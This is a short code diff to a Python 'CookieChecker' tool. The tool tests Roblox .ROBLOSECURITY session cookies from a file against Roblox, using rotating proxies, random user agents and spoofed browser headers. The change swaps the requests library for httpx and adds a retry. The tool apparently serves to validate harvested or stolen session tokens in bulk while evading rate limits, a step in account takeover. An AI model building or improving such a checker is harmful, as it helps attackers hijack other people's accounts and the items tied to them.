@@ -1,6 +1,6 @@
 import os
 import concurrent.futures
-import requests
+import httpx
 from Tool import Tool
 from utils import Utils
 
@@ -52,7 +52,7 @@ class CookieChecker(Tool):
             f.close()
             os.replace(self.cache_file_path, self.cookies_file_path)
 
-    @Utils.retry_on_exception(1)
+    @Utils.retry_on_exception(2)
     def test_cookie(self, cookie, use_proxy):
         user_agent = self.get_random_user_agent()
         proxies = self.get_random_proxies() if use_proxy else None
@@ -61,7 +61,7 @@ class CookieChecker(Tool):
         req_cookies = { ".ROBLOSECURITY": cookie }
         req_headers = {"User-Agent": user_agent, "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.roblox.com", "Referer": "https://www.roblox.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
 
-        response = requests.get(req_url, headers=req_headers, cookies=req_cookies, proxies=proxies)
+        response = httpx.get(req_url, headers=req_headers, cookies=req_cookies, proxies=proxies)
 
         result = response.json()
 
